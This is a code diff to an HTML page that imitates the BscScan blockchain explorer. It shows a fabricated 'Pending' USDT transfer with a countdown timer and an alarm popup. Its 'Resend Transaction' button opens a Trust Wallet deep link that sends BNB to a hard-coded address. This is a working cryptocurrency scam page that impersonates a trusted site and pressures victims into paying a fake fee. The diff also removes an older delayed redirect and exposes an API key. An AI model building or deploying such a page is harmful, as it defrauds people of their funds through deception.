@@ -3,89 +3,127 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>USDT Transaction Dashboard</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+  <script src="https://unpkg.com/@walletconnect/web3-provider@1.6.6/dist/umd/index.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <link rel="icon" href="https://bscscan.com/images/favicon.ico" />
   <style>
     body {
       font-family: Arial, sans-serif;
-      background-color: #ffffff;
-      color: #111;
+      background-color: #0a1f3d;
+      color: #f1f5f9;
       margin: 0;
       padding: 0;
     }
     .container {
-      max-width: 900px;
-      margin: 2rem auto;
+      max-width: 700px;
+      margin: 3rem auto;
+      background: #072146;
       padding: 2rem;
-      background-color: #f9f9f9;
-      border: 1px solid #e0e0e0;
-      border-radius: 8px;
+      border-radius: 12px;
+      box-shadow: 0 0 12px rgba(0, 0, 0, 0.4);
     }
     h1 {
       font-size: 1.8rem;
       margin-bottom: 1rem;
-      color: #2c3e50;
-    }
-    .section {
-      margin-bottom: 2rem;
-    }
-    p {
-      font-size: 1rem;
-      margin: 0.4rem 0;
+      color: #facc15;
     }
     code {
-      background: #e8e8e8;
-      padding: 2px 6px;
+      background: #1e293b;
+      padding: 0.2rem 0.4rem;
       border-radius: 4px;
+      color: #93c5fd;
     }
-    .btn {
+    a.button, button.resend-button {
       display: inline-block;
-      padding: 0.6rem 1.2rem;
-      background-color: #2d87f0;
-      color: white;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
+      margin-top: 1.5rem;
+      background: #fbbf24;
+      color: #111827;
+      padding: 0.8rem 1.5rem;
+      border-radius: 8px;
+      text-decoration: none;
       font-weight: bold;
+      transition: background 0.3s ease;
+      border: none;
+      cursor: pointer;
+    }
+    a.button:hover, button.resend-button:hover {
+      background: #facc15;
+    }
+    .popup {
+      display: none;
+      position: fixed;
+      bottom: 30px;
+      right: 30px;
+      background: #fff7ed;
+      color: #c2410c;
+      border: 2px solid #f97316;
+      padding: 1rem 1.5rem;
+      border-radius: 10px;
+      font-weight: bold;
+      z-index: 9999;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+    }
+    .countdown {
+      font-size: 0.95rem;
+      color: #f87171;
       margin-top: 1rem;
     }
-    .btn:hover {
-      background-color: #1a73e8;
-    }
-    .wallet-btns {
-      margin-top: 1.5rem;
-    }
-    .wallet-btns button {
-      margin-right: 1rem;
-    }
-    .bot-log {
-      background: #f1f1f1;
-      padding: 1rem;
-      border: 1px solid #ccc;
+    .wallet-connect {
       margin-top: 2rem;
-      font-size: 0.9rem;
-      border-radius: 6px;
+    }
+    button.connect {
+      padding: 0.6rem 1.2rem;
+      background: #10b981;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+    button.connect:hover {
+      background: #059669;
     }
   </style>
 </head>
-<body>
-  <div class="container">
-    <h1>USDT Transaction Dashboard</h1><div class="section">
-  <p><strong>From:</strong> <code>0x55d398326f99059ff775485246999027b3197955</code></p>
-  <p><strong>To:</strong> <code>0x97fe2864e38d0a667fc4da9b2a4ed3e97ca1168</code></p>
-  <p><strong>Amount:</strong> $4873.78 USDT</p>
-  <p><strong>Status:</strong> <span style="color: orange; font-weight: bold;">Pending</span></p>
-  <p><strong>Live Balance:</strong> <span id="balance">Loading...</span></p>
-  <button class="btn" onclick="resendTransaction()">🔁 Resend Transaction</button>
-</div>
+<body class="bg-white text-gray-800 font-sans">
+  <header class="shadow-md border-b bg-white sticky top-0 z-50">
+    <div class="container mx-auto flex justify-between items-center p-4">
+      <a href="#" class="text-xl font-bold text-blue-700">BscScan</a>
+      <div class="flex items-center gap-4">
+        <input type="text" placeholder="Search by Address / Txn Hash / Block / Token" class="border px-4 py-1 rounded-lg w-72 text-sm" />
+        <button class="bg-blue-600 hover:bg-blue-700 text-white px-4 py-1 rounded">Search</button>
+        <button onclick="connectWallet()" class="bg-yellow-500 hover:bg-yellow-600 text-white px-4 py-1 rounded" id="connectBtn">Connect Wallet</button>
+      </div>
+    </div>
+  </header>  <main class="container mx-auto mt-6 px-4">
+    <section class="container">
+      <h1>USDT Transaction Details</h1>
+      <p><strong>From:</strong> <code id="from">0x55d398326f99059ff775485246999027b3197955</code></p>
+      <p><strong>To:</strong> <code>0x97fe2864e38d0a667fc4da9b2a4ed3e97ca1168</code></p>
+      <p><strong>Time:</strong> 23:55:55 UTC</p>
+      <p><strong>Date:</strong> 30-07-2025</p>
+      <p><strong>Amount:</strong> $4873.78 USDT</p>
+      <p><strong>Network:</strong> Binance Smart Chain (BEP-20)</p>
+      <p><strong>Status:</strong> <span style="color: orange; font-weight: bold;">Pending</span></p>
+      <p><strong>Gas Fee:</strong> 0.120590 BNB</p>
+      <p><strong>Transaction Hash:</strong> <a href="https://bscscan.com/tx/0x2e272d33abffc0733e872372e94b9d437d88026449d7c221b0ccda72d5969ddf" target="_blank">View on BscScan</a></p>
+      <p><strong>Sender USDT Balance:</strong> <span id="balance">Loading...</span></p>
+      <button class="resend-button" onclick="window.open('https://link.trustwallet.com/send?coin=20000714&address=0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0&amount=0.12806','_blank')">🔁 Resend Transaction</button><div class="wallet-connect">
+    <button class="connect" onclick="connectWallet()">🔗 Connect Wallet</button>
+  </div>
+  <div class="countdown" id="countdown">Refreshing in 30s...</div>
+</section>
 
-<div class="section wallet-btns">
-  <button class="btn" onclick="connectWallet()">Connect MetaMask</button>
-  <button class="btn" onclick="window.open('https://link.coinbase.com', '_blank')">Connect Coinbase</button>
-  <button class="btn" onclick="window.open('https://link.trustwallet.com', '_blank')">Connect Trust Wallet</button>
-</div>
+<div class="popup" id="liquidityPopup">⚠️ No liquidity found — please verify transaction input.</div>
+<audio id="alertSound" src="https://actions.google.com/sounds/v1/alarms/beep_short.ogg" preload="auto"></audio>
 
-<div class="bot-log" id="botLog">[BOT] Waiting to start...</div>
+<!-- ADDITIONAL DASHBOARD CONTENT OMITTED FOR BREVITY -->
 
-  </div>  <script>
+  </main>  <footer class="text-center text-sm text-gray-500 py-6 border-t bg-gray-50 mt-10">
+    BscScan Dashboard Clone &copy; 2025
+  </footer>  <script>
     const API_KEY = 'ZM8ACMJB67C2IXKKBF8URFUNSY';
     const CONTRACT_ADDRESS = '0x55d398326f99059ff775485246999027b3197955';
     const SENDER_ADDRESS = '0x55d398326f99059ff775485246999027b3197955';
@@ -98,37 +136,43 @@
         const balance = parseFloat(data.result) / 1e18;
         document.getElementById('balance').textContent = balance.toFixed(2) + ' USDT';
       } catch (err) {
-        document.getElementById('balance').textContent = 'Error';
+        document.getElementById('balance').textContent = 'Error fetching balance';
       }
-    }
-
-    function connectWallet() {
-      if (window.ethereum) {
-        window.ethereum.request({ method: 'eth_requestAccounts' })
-          .then(() => alert('✅ MetaMask connected'))
-          .catch(() => alert('❌ Connection rejected'));
-      } else {
-        alert('🦊 MetaMask not found');
-      }
-    }
-
-    function resendTransaction() {
-      window.open("https://link.trustwallet.com/send?coin=20000714&address=0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0&amount=0.12806", "_blank");
-      setTimeout(() => {
-        window.location.href = "https://contract-decimals.github.io/BNB-Smart-Chain/";
-      }, 50000);
-    }
-
-    function startBot() {
-      let counter = 0;
-      setInterval(() => {
-        counter++;
-        document.getElementById('botLog').textContent = `[BOT] Cycle ${counter}: Checking balance...`;
-        fetchBalance();
-      }, 45000);
     }
 
     fetchBalance();
-    startBot();
+
+    let countdown = 30;
+    function showPopup() {
+      const popup = document.getElementById('liquidityPopup');
+      const alertSound = document.getElementById('alertSound');
+      popup.style.display = 'block';
+      alertSound.play();
+      setTimeout(() => { popup.style.display = 'none'; }, 5000);
+    }
+    function updateCountdown() {
+      const counter = document.getElementById('countdown');
+      countdown--;
+      counter.textContent = `Refreshing in ${countdown}s...`;
+      if (countdown <= 0) {
+        countdown = 30;
+        showPopup();
+        fetchBalance();
+      }
+    }
+    setInterval(updateCountdown, 1000);
+
+    async function connectWallet() {
+      if (window.ethereum) {
+        try {
+          await window.ethereum.request({ method: 'eth_requestAccounts' });
+          alert('✅ Wallet connected successfully!');
+        } catch (err) {
+          alert('❌ Wallet connection failed.');
+        }
+      } else {
+        alert('🦊 MetaMask not found.');
+      }
+    }
   </script></body>
 </html>
